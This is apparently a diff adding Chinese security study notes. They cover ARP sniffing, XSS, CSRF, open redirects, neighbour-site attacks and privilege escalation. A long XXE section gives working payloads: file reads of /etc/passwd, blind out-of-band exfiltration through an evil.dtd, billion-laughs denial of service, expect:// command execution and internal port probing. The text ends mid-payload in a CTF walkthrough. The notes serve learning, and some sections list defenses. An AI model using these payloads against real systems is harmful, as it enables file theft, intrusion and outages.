+有时候攻击者在入侵目标时，由于安全措施很到位，不能获得权限，而且服务器只有一个web站点，无法旁注，这时候攻击者就可能通过c段arp嗅探的方式，继续入侵指定的目标站点<br>
+c段攻击就是指同一网关下的主机arp嗅探，在嗅探出敏感数据后继续实施对目标站点的渗透</p>
+<p>eg：攻击者的目标站点为 www.sangfor.com.cn   服务器ip地址为 192.168.1.100</p>
+<p>在无法直接渗透目标服务器时，攻击者就可能去入侵与192.168.1.100在同一网关下的服务器，一般会是192.168.1.x，也就是c段ip，在得到服务器权限后，对目标主机实施arp嗅探</p>
+<p>用工具举例说明<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274869809.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274874148.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274878418.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274882340.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274887250.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274889821.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274893442.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274895920.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274899113.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274902464.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274909374.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626274912383.png" alt="" loading="lazy"></p>
+<p>防御arp攻击<br>
+1.静态绑定（对每台主机进行ip和mac地址静态绑定）<br>
+2.arp防火墙</p>
+<h1 id="2021-07-15">2021-07-15</h1>
+<p><strong>xss危害简单概括</strong></p>
+<p>网络钓鱼，包括盗取各类用户账号<br>
+窃取用户cookie资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作<br>
+劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账，强制发表日志，发送电子邮件等<br>
+强制弹出广告页面，刷流量等<br>
+网页挂马<br>
+进行恶意操作，例如任意篡改页面信息，删除文章等<br>
+进行大量的客户端攻击，如DDOS攻击<br>
+获取客户端信息，例如用户的浏览历史，真实ip，开放端口等<br>
+控制受害者机器向其他网站发起攻击<br>
+结合其他漏洞进一步扩大攻击<br>
+提升用户权限，包括进一步渗透网站<br>
+传播XSS跨站脚本蠕虫等</p>
+<p><strong>csrf跨站请求伪造</strong></p>
+<p>原理：攻击者盗用了你的身份，以你的名义进行某些非法操作，csrf能够使用你的账户发送邮件，获取你的铭感信息甚至盗走你的财产</p>
+<p>步骤：1.登陆受信任网站a，并在本地生成cookie<br>
+2.在不登出a的情况下，访问恶意网站b</p>
+<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1626312003724.png" alt="" loading="lazy"></figure>
+<p>csrf与xss的区别：<br>
+xss：<br>
+攻击者发现xss漏洞--构造代码--发送给受害人--受害人打开--攻击者获取受害人的cookie--完成攻击<br>
+攻击者需要登陆后台完成攻击</p>
+<p>csf：攻击者发现csrf漏洞--构造代码--发送给受害人--受害人打开--受害人执行代码--完成攻击<br>
+攻击时管理员自己实现的，攻击者只负责了构代码</p>
+<p>csrf少了获取cookie的步骤，因为受害人在执行恶意代码的时候就已经完成了攻击而攻击者并没有参与进来</p>
+<p><strong>漏洞分类</strong><br>
+get：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626312012585.png" alt="" loading="lazy"></p>
+<p>post：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626312017365.png" alt="" loading="lazy"></p>
+<p>常见的csrf方式</p>
+<pre><code>&lt;img&gt;标签属性
+&lt;img src=“http://漏洞地址”&gt;
+
+&lt;script&gt;标签属性
+&lt;script src=“http://漏洞地址”&gt;
+
+&lt;iframe&gt;标签属性
+&lt;iframe src=“http://漏洞地址”&gt;
+
+JavaScript方法
+Image对象
+&lt;script&gt;
+var foo = new Image();
+foo.src = “http://漏洞地址”
+&lt;/script&gt;
+</code></pre>
+<p>防御：<br>
+验证HTTP Referer字段<br>
+Token验证<br>
+添加验证码</p>
+<h1 id="url重定向">url重定向</h1>
+<p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，例如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。</p>
+<p><strong>客户端重定向：</strong><br>
+用户浏览器的地址栏URL会用变化</p>
+<p>http://www.test.com/test1.php<br>
+点击“登录”后会指向<br>
+http://www.test.com/login.php</p>
+<p><strong>服务端重定向：</strong><br>
+用户浏览器的地址栏URL不会变化</p>
+<p>http://www.test.com/test1.php<br>
+点击“登录”后浏览器的地址栏URL不会变化，但页面会变化</p>
+<p>能够重定向道任意域名叫做自由重定向，自由重定向可能会导致用户在不知情的情况下被带到其他域名的网站，从而遭到钓鱼攻击</p>
+<p>自由重定向示例：<br>
+http://example.jp/?continue=http://trap.example.com/<br>
+通过以上url跳转到http://trap.example.com/<br>
+钓鱼攻击的常见手段为：将用户带到伪装成著名网站的恶意网站并诱使用户输入个人呢信息</p>
+<p>攻击方式<br>
+一个典型的登录跳转如下：</p>
+<pre><code>&lt;?php
+$url=$_GET['id'];
+header(&quot;Location: $url&quot;);
+?&gt;
+</code></pre>
+<p>id没有任何限制，因此提交</p>
+<p>http://localhost/test.php?id=http://sangfor.com.cn</p>
+<p>钓鱼攻击的利用<br>
+Phishing Frenzy<br>
+https://www.phishingfrenzy.com/<br>
+https://github.com/pentestgeek/phishing-frenzy</p>
+<p>Weeman<br>
+https://github.com/Hypsurus/weeman<br>
+Weeman</p>
+<pre><code>help
+
+show     : show default settings.
+set         : set value for option (set &lt;option&gt; &lt;value&gt;).
+run        : start the server.
+clear      : clear screen.
+help       : show help or (help &lt;option&gt;.)
+framework   : load the modules framework.
+quit        : quit.
+</code></pre>
+<p><strong>修复方案</strong><br>
+加入referer的限制，保证该url的有效性，避免恶意用户自己生成跳转链接<br>
+加入有效性验证token，避免用户生成自己的恶意链接从而被利用（但是如果功能本身要求比较开放，可能会产生一定的限制）<br>
+设置严格白名单及网络边界，功能要求比较开放的情况下，需要严格限定协议以及可访问的网络</p>
+<h1 id="旁注攻击提权思路">旁注攻击&amp;提权思路</h1>
+<p>旁注攻击即攻击者在攻击目标时，对目标网站“无从下手”，找不到漏洞时候，攻击者就可能会通过具有同一服务器的网站渗透到目标网站，从而获取目标站点的权限。这一个过程就是旁注攻击的过程。</p>
+<pre><code>  一般的虚拟空间，VPS（虚拟专用服务器）或与他人合租的服务器，也有一些企业的多个业务系统在同一服务器中。当多个网站放置在同一服务器时，目标网站设计得非常安全，但并不能保证同一服务器上的所有网站都是安全的。
+</code></pre>
+<p>VPS（Virtual Private Server 虚拟专用服务器）技术，将一台服务器分割成多个虚拟专享服务器的优质服务。实现VPS的技术分为容器 [1]  技术，和虚拟化技术 [2]  。在容器或虚拟机中，每个VPS都可分配独立公网IP地址、独立操作系统、实现不同VPS间磁盘空间、内存、CPU资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于IDC资源租用。</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626315944733.png" alt="" loading="lazy"><br>
+如图所示：一个服务器可能存在多个网站或者多个数据库，如test1.com test2.com test3.com test4.com，web应用程序分别在D盘的test1 test2 test3 test4 目录中，分别使用了mysql和sqlserver两种数据库。<br>
+那么，当目标test1没发现漏洞时，而在test2中发现了漏洞获取了mysql的root权限，那就能直接影响到test1的数据库<br>
+那么，当目标为test3时，因不同的数据库关系，这时就得对服务器进行提权了</p>
+<p><strong>方法</strong></p>
+<p>1.IP逆向查询<br>
+通过IP逆向查询可以查到部署在同一web服务器上的其他网站<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626316044451.png" alt="" loading="lazy"><br>
+如常用的查询站点：<br>
+http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
+http://s.tool.chinaz.com/same<br>
+http://www.114best.com/ip/<br>
+http://dns.aizhan.com/</p>
+<p>2.CDN查询<br>
+说到旁注攻击，就不得不提起CDN，服务器使用CDN之后，真实的IP将会隐藏起来，攻击者无法找到目标主句的，也就无法进行旁注攻击。CDN即内容分发网络，其基本思路是：尽可能地避开互联网上有可能影响数据传输速度和稳定性的瓶颈，环节，使内容的传输速度更快，更稳定</p>
+<p>1.网站查询<br>
+http://www.cdnplanet.com/tools/cdnfinder/<br>
+http://www.17ce.com/<br>
+2.分析二级域名的解析地址<br>
+3.分析服务器IP的历史变化<br>
+http://toolbar.netcraft.com/<br>
+4.查找隐藏在网站目录类似phpinfo()的函数页面，能直接显示出服务器的相关     配置，看目录扫描的自带强大程度</p>
+<p><strong>提权简述</strong></p>
+<p>提权是将服务器的普通用户提升为管理员用户的一种操作，提权常常用于旁注。<br>
+例如：攻击者己经获取到目标网站的同一服务器的任意网站，通过对服务器提权拿到了服务器管理员权限，当拥有服务器的管理员权限后，几乎可以对服务器进行任何操作，更何况是服务器上存放的一个网站呢？换句话说，有时旁注攻击成功的关键就是看服务器提权成功与否。</p>
+<p>攻击者对服务器提权一般分为两种：<br>
+一种是溢出提权，另一种是第三方组件提权。（其他的：社工提权）</p>
+<p>溢出提权</p>
+<p>是指攻击者利用系统本身或系统中软件的漏洞来获取root权限，其中溢出提权又分为远程溢出和本地溢出<br>
+远程溢出是指攻击者只需与服务器建立连接，然后根据系统漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限，例如知名的ms-08067<br>
+本地溢出是主流的提权方式，攻击者通常会向服务器上传本地溢出程序在服务器指执行，如果系统村子啊漏洞，那么将会溢出root权限</p>
+<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1626316783900.png" alt="" loading="lazy"></figure>
+<h1 id="2021-07-19">2021-07-19</h1>
+<h1 id="网络安全绪论">网络安全绪论</h1>
+<p>**攻击的过程：**准备阶段，实施阶段，售后阶段<br>
+准备阶段：确定攻击目标，信息收集，服务分析，系统分析，漏洞分析<br>
+实施阶段：缓冲区溢出，拒绝服务，后门，木马，病毒<br>
+售后阶段：留下后门，隐藏踪迹</p>
+<p>**防护措施：**个人防护措施，常用的防护措施<br>
+个人防护措施：防火墙，加密重要文件，杀毒软件定期升级和杀毒，定期备份系统或重要文件，定期升级补丁<br>
+常用的防护措施：完善安全管理制度，采取访问控制措施，运行数据加密措施，数据备份与恢复</p>
+<p>**现状：**攻击者需要的技术水平逐渐降低，手段更加灵活，联合攻击急剧增多</p>
+<p>**0day漏洞：**在安全补丁发布前被了解和掌握的漏洞信息</p>
+<p>**设计准则：**木桶原则，整体性原则，安全性评价与平衡原则，标准化与一致性原则，技术与管理相结合原则，统筹规划分步实施原则，等级性原则，动态发展原则，易操作原则</p>
+<p>**威胁信息系统的主要方法：**冒充，旁路控制，破化信息的完整性，破坏系统的可用性，重放，截收和辐射侦探，陷门，特洛伊木马，抵赖</p>
+<p>**挂马：**通过各种手段，SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day，等各种方法获得管理员账户，登陆网站后台，或者webshell，修改网站的内容上传木马等。</p>
+<p>**安全策略：**定义，目的，必要性，基本原则<br>
+定义：针对那么些被允许进入某一组，可以访问网站技术资源和信息资源所规定，必须遵守的规则<br>
+目的：觉得一个组织机构应该怎样保护自己，阐明机构安全政策的总体思想，让所有用户，操作人员和管理员清楚，为了保护技术和信息资源所必须遵守的原则，提供一个可获得，能够配置和检查的用于确定是否与计算机和网络系统的策略一致的基准<br>
+必要性：强调了策略的核心作用，强调了检测，响应，防护的动态性，检测，响应，防护必须遵循的安全策略进行<br>
+基本原则：适用性，可行性，动态性，简单性，系统性</p>
+<p>**定义：**基本定义，简单说明，包括<br>
+定义：系统硬件，软件受到保护，不因偶然恶意的破坏，更改，泄露，能连续，可靠正常的运行，服务不中断<br>
+简单说明：能够识别和消除不安全因素的能力<br>
+包括：运行系统的安全，网络上系统信息的安全，网络上信息传播的安全</p>
+<p>**体系层次：**物理层安全，系统层安全，网络层安全，应用层安全，管理层安全</p>
+<p>**基本需求：**可靠性，可用性，保密性，不可抵赖性，可控性，可审查性，真实性</p>
+<p>**威胁的主要因素：**信息系统自身安全的脆弱性，操作系统与应用程序漏洞，安全管理问题，黑客攻击，网络犯罪</p>
+<p><strong>黑客入侵行为模型图：</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626663738651.png" alt="" loading="lazy"></p>
+<p>解说：黑客入侵一般的完整模式为：踩点-&gt;扫描-&gt;查点-&gt;分析并入侵-&gt;获取权限-&gt;提升权限-&gt;扩大范围-&gt;安装后门-&gt;清除日志，这几个大的行为模块<br>
+资源扩张：指利用已获得的密码尝试登陆其他主机或者其他服务<br>
+其他手段：值类似于发送E-mail的方式，比如通过恶意网页等其他欺骗方式。还包括进来一些利用winnt/2k会话缺陷在远程嗅探其密码的新攻击方法<br>
+踩点：大多数的dns服务器允许用户获取域名记录文件内容，这样就可以了解到网站的详细网络分布结构。另外网络服务商可以查询得到公司地址及人员内部邮件，电话等等，以及单位注册的ip范围等重要信息。又是这一步骤会比扫描还重要</p>
+<h1 id="xxexml-external-entity-attackxml外部实体注入攻击">XXE(XML External Entity attack)XML外部实体注入攻击</h1>
+<p>导语<br>
+　　XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load 默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）。</p>
+<p>尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应有的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。 比如今年7月刚爆出的微信支付XXE漏洞案例。</p>
+<p>libxml2.9.1及以后，默认不解析外部实体。可以在此了解libxml各版本具体改动情况。本次测试在Window下使用的php5.4.45(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。当XML声明中standalone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<p>XML外部实体<br>
+　　本文主要讲外部实体注入攻击，所以基本的XML语法就不过多的描述。主要看一下DTD-实体。</p>
+<p>首先让我们了解一下基本的PAYLOAD结构：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702514550.png" alt="" loading="lazy"><br>
+DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626832773670.png" alt="" loading="lazy"><br>
+<strong>实体分为一般实体和参数实体</strong></p>
+<p>1.一般实体的声明：<!ENTITY 实体名称 "实体内容"></p>
+<p>引用一般实体的方法：&amp;实体名称;</p>
+<p>p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
+<p>2.参数实体的声明：<!ENTITY % 实体名称 "实体内容"></p>
+<p>引用参数实体的方法：%实体名称;</p>
+<p>p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
+<p>如果实体名称中出现如&lt;的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用&lt;、 &gt;、 &amp;、 &amp;apos、 &quot;替换&lt;、&gt;、&amp;、'、&quot;。</p>
+<p><strong>DTD实体声明（重点</strong>）</p>
+<p><strong>1.内部实体声明</strong></p>
+<p><!ENTITY 实体名称 "实体的值"></p>
+<p>当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</p>
+<p>示例：</p>
+<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY writer &quot;Dawn&quot;&gt;
+&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
+]&gt;
+&lt;test&gt;&amp;writer;©right;&lt;/test&gt;
+</code></pre>
+<p><strong>2. 外部实体声明</strong></p>
+<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
+</code></pre>
+<p>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702482719.png" alt="" loading="lazy"><br>
+其中PHP支持的协议会更多一些，但是需要一定的扩展支持：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702456017.png" alt="" loading="lazy"><br>
+　示例：</p>
+<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
+]&gt;
+&lt;author&gt;&amp;file;©right;&lt;/author&gt;
+</code></pre>
+<p><strong>XXE的攻击与危害</strong><br>
+　　当我们了解清楚以上的信息后，我们就能理解如何构造外部实体注入攻击与它的危害性了。</p>
+<p>如何构造外部实体注入攻击<br>
+　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
+<p>有回显的payload写法：</p>
+<p>直接通过DTD外部实体声明。XML内容如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;
+</code></pre>
+<p>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
+&lt;abc&gt;&amp;b;&lt;/abc&gt;
+</code></pre>
+<p>evil.dtd内容：</p>
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre>
+<p>通过DTD外部实体声明引入外部实体声明。XML内容如下:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
+%d;
+]&gt;
+&lt;abc&gt;&amp;b;&lt;/abc&gt;
+</code></pre>
+<p>evil.dtd内容：</p>
+<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre>
+<p>但是如果想通过如下声明是不可以的：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a [
+&lt;!ENTITY d SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;d;&lt;/abc&gt;
+</code></pre>
+<p>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。</p>
+<p>无回显的payload写法：</p>
+<p><strong>第一种无回显示payload写法：</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; 
+%dtd; %all; 
+]&gt; 
+&lt;abc&gt;&amp;send;&lt;/abc&gt;
+</code></pre>
+<p>其中evil.xml文件内容为</p>
+<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost%file;'&gt;&quot;&gt;
+</code></pre>
+<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</p>
+<p><strong>第二种无回显payload写法：</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+%dtd;
+%send;
+]&gt;
+&lt;abc&gt;&lt;/abc&gt;
+其中evil.xml文件内容为：
+
+&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
+</code></pre>
+<p>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
+<p>这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的        internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</p>
+<p>一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析。</p>
+<p><strong>XXE带来的危害</strong><br>
+　　利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p>
+<p>首先准备一个有XXE漏洞的文件，本次测试以php为主：</p>
+<pre><code>&lt;?php
+$xml = simplexml_load_string($_REQUEST['xml']);
+echo &quot;&lt;pre&gt;&quot; ;
+print_r($xml);//注释掉该语句即为无回显的情况
+?&gt;
+</code></pre>
+<p><strong>危害1.读取任意文件</strong></p>
+<p>有回显情况:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY test SYSTEM &quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626702413435.png" alt="" loading="lazy"><br>
+无回显情况:</p>
+<p>本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+%dtd;
+%send;
+]&gt;
+&lt;abc&gt;&lt;/abc&gt;
+</code></pre>
+<p>远程服务器部署evil.xml内容为:</p>
+<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626702211666.png" alt="" loading="lazy"><br>
+YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==Base64解码即可。</p>
+<p>通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
+<p><strong>危害2.拒绝服务攻击</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol &quot;lol&quot;&gt;
+&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
+</code></pre>
+<p>此示例就是著名的Billion laughs attack该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个&quot;Ha！&quot;字符串，从而导致 DoS 攻击。</p>
+<p>原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
+<p><strong>危害3.远程命令(代码)执行</strong></p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;
+</code></pre>
+<p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
+<p><strong>危害4.内网信息探测</strong></p>
+<p>利用http协议http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</p>
+<p>有回显情况：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY [
+&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;
+]&gt;
+&lt;abc&gt;&amp;test;&lt;/abc&gt;
+</code></pre>
+<p>当端口开放时，如80端口：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702632954.png" alt="" loading="lazy">)<br>
+当端口未开放时，如81端口:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702272399.png" alt="" loading="lazy"><br>
+无回显情况：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:81/&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
+%dtd;
+%send;
+]&gt;
+&lt;abc&gt;&lt;/abc&gt;
+</code></pre>
+<p>远程服务器部署evil.xml内容为:</p>
+<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
+</code></pre>
+<p>观察日志文件即可。</p>
+<p>当端口开放时，如80端口:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702609532.png" alt="" loading="lazy"><br>
+当端口未开放时，如81端口:<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702614433.png" alt="" loading="lazy"><br>
+有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。</p>
+<p><strong>危害5.攻击内网网站</strong></p>
+<p>难得搭建环境，就直接引用网上的例子吧：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702620816.png" alt="" loading="lazy"><br>
+这个示例是攻击内网strusts2网站，远程执行系统命令。</p>
+<p>还可部署bash文件建立监听，获得反弹shellcode等。</p>
+<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
+<p>CTF题目</p>
+<p><strong>JarvisOJ——api调用</strong><br>
+请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
+<p>题目入口：http://web.jarvisoj.com:9882/</p>
+<p>先查看源码：<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702685525.png" alt="" loading="lazy"><br>
+再看响应<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626702690221.png" alt="" loading="lazy"><br>
+开始以为是考反序列化，但根据提示和结果发现不是。这个页面仅仅是向后台发送请求，后台再响应返回几个特定的字符串，修改请求值，发现返回与前台的输入没多大关系。最后，知道是XXE。</p>
+<p>这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml，然后传入xml代码：</p>
+<pre><code>&lt;?xml version=”1.0″?&gt;
+&lt;!DOCTYPE a[
+&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;
